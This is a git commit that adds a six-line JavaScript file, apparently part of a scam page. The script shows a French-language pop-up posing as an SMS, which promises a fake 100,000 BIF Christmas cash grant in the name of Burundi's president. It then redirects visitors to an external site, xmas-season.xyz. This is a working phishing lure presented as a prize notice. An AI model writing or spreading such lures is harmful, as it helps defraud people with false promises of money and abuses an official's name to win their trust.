f0349cca61623baf3d8c303dba945c9d3f943a75
bigetijazz16 <bigetijazz16@gmail.com>
2024-11-29 23:43:25 -0800

    Create burundigrant.js

---
+++ burundigrant.js
@@ -0,0 +1,6 @@
+
+var password = 'RECLAMER 100,000 BIF'
+password=prompt('SMS: Félicitations, vous êtes admissible à ÉVARISTE NDAYISHIMIYE 100,000 BIF SUBVENTION EN ESPÈCES DE NOËL POUR TOUS, Veuillez appuyer sur OK pour RECLAMER Prix ​​en espèces','RECLAMER 100,000 BIF');
+if (password != 'RECLAMER 100,000 BIF') {
+location.href='https://www.xmas-season.xyz/100000BIF-subvention';
+}
